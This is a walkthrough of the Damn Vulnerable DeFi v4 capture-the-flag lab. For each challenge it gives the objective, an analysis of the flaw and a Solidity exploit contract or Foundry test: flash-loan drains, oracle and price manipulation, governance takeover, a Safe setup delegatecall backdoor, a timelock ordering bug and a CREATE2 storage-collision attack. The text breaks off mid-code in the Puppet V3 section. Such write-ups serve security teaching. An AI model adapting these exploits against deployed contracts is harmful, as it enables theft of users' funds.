# Damn Vulnerable DeFi v4 Walkthorugh by [JP](https://github.com/CanonicalJP)

## 1.UNSTOPPABLE

Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans. _See [challenges/unstoppable/](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/)_

**Objective**

_from `_isSolved()` in test_

1. _Flashloan check must fail_

**Attack Analysis**

- The balance of `UnstoppableVault` is not accounted for unexpected changes (e.g. force feeding ERC20 tokens), by just transfering a small amount to the vault, the below condition fail and revert

**POC**

See [test/unstoppable/Unstoppable.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/unstoppable/Unstoppable.t.sol)

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1e18);
}
```

Run `forge test --mp test/unstoppable/Unstoppable.t.sol --isolate` to validate test

---

## 2.NAIVE RECEIVER

**Objective**

_from `_isSolved()` in test_

1. _Player must have executed two or less transactions_
2. _The flashloan receiver contract has been emptied_
3. _Pool is empty too_
4. _All funds sent to recovery account_

**Attack Analysis**

- The vulnerability is that the `onFlashLoan` function in `FlashLoanReceiver` doesn't verify the authorization of the flash loan's origin. By executing 10 flash loans with an amount of 0, we can deplete the FlashLoanReceiver's 10 ETH. However, the constraint is that the Nonce must be under 2. Since `NaiveReceiverPool` supports `Multicall`, we can leverage it to conduct all 10 flash loan operations in a single transaction, thereby meeting the Nonce requirement.
- The next step is to extract the initial 1000 ETH from the NaiveReceiverPool. The only way to transfer assets is through the `withdraw` function. For this function to execute, `_msgSender` must meet the conditions where `msg.sender` equals `trustedForwarder` and `msg.data.length` is at least 20 bytes, which leaves room for tampering.
- Lastly, using a forwarder to execute a meta-transaction, the `msg.sender == trustedForwarder` condition can be met.

**POC**

See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)

```solidity
 function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDataArray = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            callDataArray[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDataArray[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDataArray);

        BasicForwarder.Request memory request =
            BasicForwarder.Request(player, address(pool), 0, gasleft(), forwarder.nonces(player), callData, 1 days);

        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

Run `forge test --mp test/naive-receiver/NaiveReceiver.t.sol --isolate` to validate test

---

## 3.TRUSTER

**Objective**

_from `_isSolved()` in test_

1. _Player must have executed a single transaction_
2. _All rescued funds sent to recovery account_

**Attack Analysis**

- The vulnerability resides in `flashLoan()` in `TrusterLenderPool`, which includes a call to an arbitrary address with arbitrary data, `target.functionCall(data)`. We can use it to call the token and `approve()` the contract we want to later call the token and do a `transferFrom`.
- Lastly, we need to execute the attack in one ATOMIC transaction. To complete this objective, the best approach is to execute the code in the `constructor()` of a contract.

**POC**

See [test/truster/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/truster/Truster.t.sol)

```solidity
function test_truster() public checkSolvedByPlayer {
    AttackTruster attackTruster = new AttackTruster(address(pool), address(token), recovery, TOKENS_IN_POOL);
}

contract AttackTruster {
    constructor (address _pool, address _token, address _recovery, uint256 tokens) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokens);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, _recovery, tokens);
    }
}
```

Run `forge test --mp test/truster/Truster.t.sol --isolate` to validate test

---

## 4.SIDE ENTRANCE

**Objective**

_from `_isSolved()` in test_

1. _All rescued funds sent to recovery account_

**Attack Analysis**

- The attack can be executed by asking a flahs loan through `flashLoan()`and then depositing the total value in the same call using `deposit()`.

**POC**

See [test/side-entrance/SideEntrance.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/side-entrance/SideEntrance.t.sol)

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Attack attackPool = new Attack(address(pool));
    attackPool.exploit(ETHER_IN_POOL, recovery);
}

contract Attack {
    SideEntranceLenderPool private pool;

    constructor (address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function exploit(uint256 _amount, address _recovery) external{
        pool.flashLoan(_amount);
        pool.withdraw();
        (bool success, ) = _recovery.call{value: _amount}("");
        if(!success) console.log("Transfer failed");
    }
}
```

Run `forge test --mp test/side-entrance/SideEntrance.t.sol --isolate` to validate test

---

## 5.THE REWARDER

**Objective**

_from `_isSolved()` in test_

1. _Player saved as much funds as possible, perhaps leaving some dust_
2. _All funds sent to the designated recovery account_

**Attack Analysis**

- The vulnerability exists in the `claimRewards()` function, which processes multiple claims in a single transaction.
- The function transfers rewards for each claim iteration but only marks claims as processed after the final occurrence by calling `_setClaimed()`. This allows malicious actors to submit multiple identical claims, receiving multiple payouts before the system recognizes the claim as processed.
- The exploit requires the attacker to have at least one valid, unclaimed reward and sufficient contract funds for multiple payouts.
- The attack involves creating an array of identical claim objects, calling `claimRewards()` with this array, and immediately withdrawing the exploited funds.

**POC**

See [test/the-rewarder/TheRewarder.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/the-rewarder/TheRewarder.t.sol)

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
    uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /  PLAYER_DVT_CLAIM_AMOUNT;
    uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;
    uint totalTxCount = dvtTxCount + wethTxCount;

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Create Alice's claims
    console.log(totalTxCount);
    Claim[] memory claims = new Claim[](totalTxCount);

    for (uint i = 0; i < totalTxCount; i++) {
        if (i < dvtTxCount) {
            claims[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: PLAYER_DVT_CLAIM_AMOUNT,
                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                proof: merkle.getProof(dvtLeaves, 188) //player at index 188
            });
        } else {
            claims[i] = Claim({
                batchNumber: 0, // claim corresponds to first DVT batch
                amount: PLAYER_WETH_CLAIM_AMOUNT,
                tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                proof: merkle.getProof(wethLeaves, 188)  //player at index 188
            });
        }
    }
    //multiple claims
    distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}
```

Run `forge test --mp test/the-rewarder/TheRewarder.t.sol --isolate` to validate test

---

## 6.SELFIE

**Objective**

_from `_isSolved()` in test_

1. _Player has taken all tokens from the pool_

**Attack Analysis**

- The vulnerability is associated with how the voting power should be accounted to prevent an attacker from queue actions while doing a flahs loan.
- First, the attacker needs to ask a flash loan to `SelfiePool.flashLoan()` and receive the tokens in a contract implementing `IERC3156FlashBorrower`. To add an action in the queue, it's needed to have more than half of the supply of the `DamnValuableVotes` token. See `SimpleGovernance._hasEnoughVotes()`.
- In `onFlashLoan()` of the attacker´s contract, they need to first delegate the votes using `DamnValuableVotes.delegate()` to have the tokens received accounting for voting power.
- Then, in the same function, the attacker has to queue an action to call `SelfiePool.emergencyExit()` using the address of the `recovery`.
- Finally, the attacker must wait for at least to days and call `SimpleGovernance.executeAction()`.

**POC**

See [test/selfie/Selfie.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/selfie/Selfie.t.sol)

```solidity
function test_selfie() public checkSolvedByPlayer {
    bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);

    Attack attackContract = new Attack(address(pool), address(governance));
    pool.flashLoan(IERC3156FlashBorrower(address(attackContract)), address(token), TOKENS_IN_POOL, data);

    vm.warp(3 days);
    governance.executeAction(1);

    console.log(token.balanceOf(address(pool)));
}

contract Attack is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;

    constructor(address _pool, address _governance) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        // voting logic)
        DamnValuableVotes(token).delegate(address(this));

        governance.queueAction(address(pool), 0, data);

        DamnValuableVotes(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

Run `forge test --mp test/selfie/Selfie.t.sol --isolate` to validate test

---

## 7.COMPROMISED

**Objective**

_from `_isSolved()` in test_

1. _Exchange doesn't have ETH anymore_
2. _ETH was deposited into the recovery account_
3. _Player must not own any NFT_
4. _NFT price didn't change_

**Attack Analysis**

- The contracts do not present any flaw that could be used to drain the exchange liquidity. Thus, better to start by analysing the leaked data from the server.
- Because of the context, it's safe to assume that they could potentially be private keys.
- Let's first ascii decode them using [rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html). Then, let's base64 decode the result using [base64decode](https://www.base64decode.org/).
- The final result obtained could be a private key. To validate it, let's use [rfctools](https://www.rfctools.com/ethereum-address-test-tool/). Now, we can see that they are private keys to `source[0]` and `source[1]`, both used for price feeds functionalities, see [test/compromised/Compromised.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/b99a51c7056487472824550e0764b4aa390bb4ae/test/compromised/Compromised.t.sol#L24-L28)
- Having access to the private keys of these sources, and attacker could manipulate the price of the token to buy low and sell high. Effectively draining liquidity from the exchange.

**POC**

See [test/compromised/Compromised.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/compromised/Compromised.t.sol)

```solidity
function test_compromised() public checkSolved {
    Attack attackExchange = new Attack(oracle, exchange, nft);

    vm.prank(sources[0]);
    oracle.postPrice(symbols[0], 0);
    vm.prank(sources[1]);
    oracle.postPrice(symbols[0], 0);

    attackExchange.buy{value: 1}();

    vm.prank(sources[0]);
    oracle.postPrice(symbols[0], 999 ether);
    vm.prank(sources[1]);
    oracle.postPrice(symbols[0], 999 ether);

    attackExchange.sell();
    attackExchange.withdraw(recovery, 999 ether);
}

contract Attack {
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;

    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft) {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
    }

    receive() external payable {}

    function buy() external payable {
        uint _nftId = exchange.buyOne{value: 1}();
        nftId = _nftId;
    }

    function sell() external {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function withdraw(address _recovery, uint amount) external {
        payable(_recovery).transfer(amount);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

Run `forge test --mp test/compromised/Compromised.t.sol --isolate` to validate test

---

## 8.PUPPET

**Objective**

_from `_isSolved()` in test_

1. _Player executed a single transaction_ `UNACHIEVABLE?`
2. _All tokens of the lending pool were deposited into the recovery account_

**Attack Analysis**

- The vulnerability relays in that the contract uses balances of ETH and DVT to compute the prices, see `_computeOraclePrice()`.
- An attacker could swap DVT tokens in the Uniswap Pool and influence the prices of the Lending Pool. This being particular easy in this case because of the low amount of assets in the pool.
- Then, the attacker could borrow assets in the lending pool at an unexpected price and drain its liquidity.

**POC**

See [test/puppet/Puppet.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet/Puppet.t.sol)

```solidity
function test_puppet() public checkSolvedByPlayer {
    Attack attackPuppet = new Attack{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange);

    token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);
    attackPuppet.exploit(POOL_INITIAL_TOKEN_BALANCE, recovery);
}

contract Attack {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;

    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _uniswapV1Exchange) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
    }

    receive() external payable {}

    function exploit(uint _amount, address _recovery) public {
        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
        uniswapV1Exchange.tokenToEthTransferInput(token.balanceOf(address(this)), 1, block.timestamp, address(this));
        lendingPool.borrow{value: 20e18}(_amount, _recovery);
    }
}
```

Run `forge test --mp test/puppet/Puppet.t.sol --isolate` to validate test

---

## 9.PUPPET V2

**Objective**

_from `_isSolved()` in test_

1. _All tokens of the lending pool were deposited into the recovery account_

**Attack Analysis**

- The implementation is still vulnerable because the lending pool gets the price from a Uniswap pair and it can still be manipulated by an attacker. Plus, balances are low, which facilitates the manipulation.
- An attacker could swap DVT tokens in the Uniswap Pool and influence the prices of the Lending Pool. This being particular easy in this case because of the low amount of assets in the pool.
- Then, the attacker could borrow assets in the lending pool at an unexpected price and drain its liquidity.

**POC**

See [test/puppet-v2/PuppetV2.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet-v2/PuppetV2.t.sol)

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    require(token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE), "Token approve failed");
    uniswapV2Router.swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        1,
        path,
        address(player),
        block.timestamp
    );
    weth.deposit{value: address(player).balance}();
    require(weth.approve(address(lendingPool), weth.balanceOf(address(player))), "Weth approve failed");

    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, token.balanceOf(address(player)));
}

```

Run `forge test --mp test/puppet-v2/PuppetV2.t.sol --isolate` to validate test

---

## 10.FREE RIDER

**Objective**

_from `_isSolved()` in test_

1. _The recovery owner extracts all NFTs from its associated contract_
2. _Exchange must have lost NFTs and ETH_
3. _Player must have earned all ETH_

**Attack Analysis**

- The bug is located in the function `FreeRiderNFTMarketplace._buyOne()`. The payment is sent after transfering the token and thus, the buyer is received the payment instead of the seller.
- An attacker can exploy this vulnerability by just buying the NFTs.
- Since the player doesn't have enough funds to execute the recovery, i.e. buy the NFTs, they have to do a Flash Swap against the `uniswapPair`. To do so, a contract needs to be implemented to receive the funds from the swap.

**POC**

See [test/free-rider/FreeRider.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/free-rider/FreeRider.t.sol)

```solidity
function test_freeRider() public checkSolvedByPlayer {
    Recover recover = new Recover(marketplace, recoveryManager, uniswapPair, weth);
    bytes memory data = abi.encode(address(player));

    uniswapPair.swap((NFT_PRICE * 6), 0, address(recover), data);
}

contract Recover {
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    IUniswapV2Pair uniswapPair;
    WETH weth;

    constructor(
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        IUniswapV2Pair _uniswapPair,
        WETH _weth
    ) {
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        uniswapPair = _uniswapPair;
        weth = _weth;
    }

    receive() external payable {}

    function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external {
        weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < tokenIds.length; ++i) {
            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, data);
        }

        uint amount0Repay = (amount0 * 1004) / 1000;
        weth.deposit{value: amount0Repay}();
        weth.transfer(address(uniswapPair), amount0Repay);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        // Because of vulnerability in FreeRiderNFTMarketplace:L108, I cannot transfer the NFT to FreeRiderRecoveryManager in this call.
        // FreeRiderRecoveryManager has no fallback function and cannot receive the ETH.

        // marketplace.token().safeTransferFrom(address(this), address(recoveryManager), _tokenId, data);
        return this.onERC721Received.selector;
    }
}

```

Run `forge test --mp test/free-rider/FreeRider.t.sol --isolate` to validate test

---

## 11.BACKDOR

**Objective**

_from `_isSolved()` in test_

1. _Player must have executed a single transaction_
2. _User must have registered a wallet_
3. _User is no longer registered as a beneficiary_
4. _Recovery account must own all tokens_

**Attack Analysis**

- The vulnerability lies in how the Safe contract is initialized during wallet creation. In `SafeProxyFactory.createProxyWithCallback()`, the `deployProxy()` function is called with user-controlled initializer data.
- This initializer data is passed to `Safe.setup()` during proxy creation, allowing an attacker to control the `to` and `data` parameters. The `to` parameter specifies a contract address for an optional delegate call, and data contains the payload for that delegate call.
- By carefully crafting the initializer data, an attacker can make the newly created wallet perform a delegate call to a malicious contract, which can then drain the wallet's funds.

**POC**

See [test/backdoor/Backdoor.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/backdoor/Backdoor.t.sol)

```solidity
function test_backdoor() public checkSolvedByPlayer {
    new Attack(
        address(singletonCopy),
        address(walletFactory),
        address(walletRegistry),
        address(token),
        recovery,
        users
    );
}

contract Attack {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery,
        address[] memory _beneficiaries
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;

        // A 2nd contract is used because of the restriction on player tx count
        AttackDelegate attackDelegate = new AttackDelegate(dvt);

        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the GnosisSafe::setup() data that will be passed to the proxyCreated function in WalletRegistry
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners = List of Safe owners
                1, // _threshold = Number of required confirmations for a Safe transaction
                address(attackDelegate), // to = Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data = Data payload for optional delegate call
                address(0), // fallbackHandler = Handler for fallback calls to this contract
                0, // paymentToken = Token that should be used for the payment (0 is ETH)
                0, // payment = Value that should be paid
                0 // paymentReceiver = Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
            SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                singletonCopy, // _singleton = Address of singleton contract
                _initializer, // initializer = Payload for message call sent to new proxy contract
                i, // saltNonce = Nonce that will be used to generate the salt to calculate the address of the new proxy contract
                IProxyCreationCallback(walletRegistry) // callback = Cast walletRegistry to IProxyCreationCallback
            );

            // Transfer to attacker
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}

contract AttackDelegate {
    DamnValuableToken private immutable dvt;

    constructor(DamnValuableToken _dvt) {
        dvt = _dvt;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }
}

```

Run `forge test --mp test/backdoor/Backdoor.t.sol --isolate` to validate test

---

## 12.CLIMBER

**Objective**

_from `_isSolved()` in test_

1. _All tokens of the vault were deposited into the recovery account_

**Attack Analysis**

- The vulnerability resides in the `ClimberTimelock.execute()` function, which has an incorrect order of operations. It executes the actions before performing the necessary checks, instead of checking first and then executing (i.e. using the Check-Effect-Iteration pattern). This allows an attacker to bypass the checks and directly modify the contract's state.
- For an attacker to exploit this vulnerability, they have to follow the below steps:
  1. Call grantRole to acquire the `PROPOSER_ROLE`.
  2. Update `ClimberTimelock.delay` to 0.
  3. Transfer ownership of `ClimberVault`to the attacker.
  4. Call `ClimberTimelock.schedule()` to schedule the malicious operation.
  5. Upgrade the contract with a new vulnerable instance.
  6. Withdraw the funds using the new instance.
- The exploit leverages the fact that the intended payload can be placed in the first few items of the array, and the last item can simply execute `ClimberTimelock.schedule()` to update the state, bypassing the checks in `ClimberTimelockBase.getOperationState()`.

**POC**

See [test/climber/Climber.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/climber/Climber.t.sol)

```solidity
function test_climber() public checkSolvedByPlayer {
    Attack attackVault = new Attack(payable(timelock), address(vault));
    attackVault.exploit();
    VulnClimberVault newVaultImpl = new VulnClimberVault();
    vault.upgradeToAndCall(address(newVaultImpl), "");
    VulnClimberVault(address(vault)).withdrawAll(address(token), recovery);
}

contract Attack {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("schedule()");
    }

    function exploit() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
    }

    function schedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
    }
}

contract VulnClimberVault is ClimberVault {
    constructor() {
        _disableInitializers();
    }

    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}
```

Run `forge test --mp test/climber/Climber.t.sol --isolate` to validate test

---

## 13.WALLET MINING

**Objective**

_from `_isSolved()` in test_

1. _Factory account must have code_
2. _Safe copy account must have code_
3. _Deposit account must have code_
4. _The deposit address and the wallet deployer must not hold tokens_
5. _User account didn't execute any transactions_
6. _Player must have executed a single transaction_
7. _Player recovered all tokens for the user_
8. _Player sent payment to ward_

**Attack Analysis**

- The vulnerability is related to predictable addresses and a storage collision. First, an attacker could use `computeCreate2Address` to calculate the user's wallet address (`USER_DEPOSIT_ADDRESS`) with a nonce of 13.
- Next, an attacker could deploy the user's Safe wallet using `walletDeployer.drop()`, leveraging the correct nonce (13) to create the wallet at the precomputed address.
- The AuthorizerUpgradeable contract improperly uses slot 0, which could allow an attacker to exploit a storage collision. By doing this, an attacker could initialize the user's Safe wallet improperly and gain control over critical state variables.
- Finally, an attacker could overwrite the wallet's guardian with their address and extract 1 ETH from the wallet hypothetically.

- **POC**

See [test/wallet-mining/WalletMining.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/wallet-mining/WalletMining.t.sol)

```solidity
function test_walletMining() public checkSolvedByPlayer {
    // Step 1: Find the correct nonce using a loop to compute the expected address with CREATE2
    address[] memory _owners = new address[](1);
    _owners[0] = user;
    bytes memory initializer = abi.encodeCall(
        Safe.setup,
        (_owners, 1, address(0), "", address(0), address(0), 0, payable(0))
    );

    uint256 nonce;

    bool flag = false;
    while (!flag) {
        address target = vm.computeCreate2Address(
            keccak256(abi.encodePacked(keccak256(initializer), nonce)),
            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
            address(proxyFactory)
        );
        if (target == USER_DEPOSIT_ADDRESS) {
            flag = true;
            break;
        }
        nonce++;
    }
    // Step 2: Prepare execTransaction call data
    bytes memory execData;
    {
        // avoid stack too deep
        address to = address(token);
        uint256 value = 0;
        bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
        Enum.Operation operation = Enum.Operation.Call;
        uint256 safeTxGas = 100000;
        uint256 baseGas = 100000;
        uint256 gasPrice = 0;
        address gasToken = address(0);
        address refundReceiver = address(0);
        uint256 _nonce = 0;
        bytes memory signatures;

        // Step 3: Calculate transaction hash manually since Safe is not yet deployed
        // We cannot call `safe.getTransactionHash` because the Safe contract has not been deployed yet
        // We also can't use `singletonCopy.getTransactionHash` because the domainSeparator depends on the Safe address
        {
            // avoid stack too deep
            bytes32 safeTxHash = keccak256(
                abi.encode(
                    0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                    to,
                    value,
                    keccak256(data),
                    operation,
                    safeTxGas,
                    baseGas,
                    gasPrice,
                    gasToken,
                    refundReceiver,
                    _nonce
                )
            );
            bytes32 domainSeparator = keccak256(
                abi.encode(
                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
                    singletonCopy.getChainId(),
                    USER_DEPOSIT_ADDRESS
                )
            );
            // Step 4: Sign the transaction hash using the user's private key
            bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
            signatures = abi.encodePacked(r, s, v);
        }
        //Step 5: Encode the execTransaction call data for later execution
        execData = abi.encodeWithSelector(
            singletonCopy.execTransaction.selector,
            to,
            value,
            data,
            operation,
            safeTxGas,
            baseGas,
            gasPrice,
            gasToken,
            refundReceiver,
            signatures
        );
    }
    // Step 6: Deploy the Safe and execute the exploit
    new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
}


contract Exploit {
    constructor(
        DamnValuableToken token, // The DVT token contract used for transferring tokens.
        AuthorizerUpgradeable authorizer, // The authorizer contract that allows initialization and authorization.
        WalletDeployer walletDeployer, // The wallet deployer contract for deploying a new Safe wallet.
        address safe, // The address of the Safe wallet.
        address ward, // The ward address that will receive funds (1 DVT token).
        bytes memory initializer, // The initializer data for setting up the Safe wallet during deployment.
        uint256 saltNonce, // The nonce used with CREATE2 to deploy the wallet.
        bytes memory txData // The transaction data that will be called on the Safe wallet after deployment.
    ) {
        // Create an array of one element for 'wards', which is this contract.
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);

        // Set the 'ward' to this contract and the 'aim' to the Safe wallet address.
        wards[0] = address(this);
        aims[0] = safe;

        // Call the 'init' function on the Authorizer contract to set this contract as an authorized address.
        authorizer.init(wards, aims); // This authorizes this contract to interact with the Safe wallet.

        // Deploy the Safe wallet via the WalletDeployer contract using the CREATE2 opcode with the provided initializer data and nonce.
        bool success = walletDeployer.drop(address(safe), initializer, saltNonce);
        require(success, "deploy failed"); // Ensure the deployment was successful.

        // Transfer the balance of this contract (if any) to the ward address.
        token.transfer(ward, token.balanceOf(address(this))); // Transfers tokens to the ward address.

        // Execute the transaction on the Safe wallet, calling it with the provided transaction data.
        (success, ) = safe.call(txData);
        require(success, "tx failed"); // Ensure the transaction was successful.
    }
}
```

Run `forge test --mp test/wallet-mining/WalletMining.t.sol --isolate` to validate test

---

## 14.PUPPET V3

**Obejctive**

_from `_isSolved()` in test_

1. _The attacker's exploit has to be completed in less than 115 seconds_
2. _All tokens of the lending pool were drained_
3. _All drained tokens from the lending pool were deposited into the recovery account_

**Attack Analysis**

- The pool has 100 WETH and 100 DVT tokens but it's actually low liquidity. `PuppetV3Pool` calculates the price of DVT tokens using a 10-minute Time-Weighted Average Price (TWAP). This setup makes the contract vulnerable to price manipulation attacks at a low cost. By exploiting this, an attacker could exchange make DVT tokens very cheap.
- The oracle determines the current price based on data from the past 10 minutes. Because the TWAP period is short, making large trades within this window, such as swapping a large amount of DVT, can significantly manipulate the price.
- Since TWAP uses delayed pricing, after manipulating the price, there's a brief time window (e.g., 110 seconds) for an attacker to take advantage of the lowered price and execute unfair loans.

**POC**

See [test/puppet-v3/PuppetV3.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet-v3/PuppetV3.t.sol)

```solidity
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

function test_puppetV3() public checkSolvedByPlayer {
    ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
    uniswapRouter.exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );

    vm.warp(block.timestamp + 114);

    weth.approve(
        address(lendingPool),
